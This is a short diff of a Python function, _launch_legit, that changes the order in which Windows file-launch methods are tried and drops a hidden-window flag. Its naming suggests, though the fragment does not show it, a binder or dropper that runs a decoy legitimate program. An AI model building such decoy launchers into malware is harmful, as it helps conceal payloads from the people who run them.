@@ -103,12 +103,11 @@ def _launch_legit(legit_data: bytes, original_name: str) -> bool:
             return False
 
     try:
-        subprocess.Popen([legit_path],
-                         creationflags=0x08000000, close_fds=True)
+        os.startfile(legit_path)
         return True
     except:
         try:
-            os.startfile(legit_path)
+            subprocess.Popen([legit_path], close_fds=True)
             return True
         except:
             return False
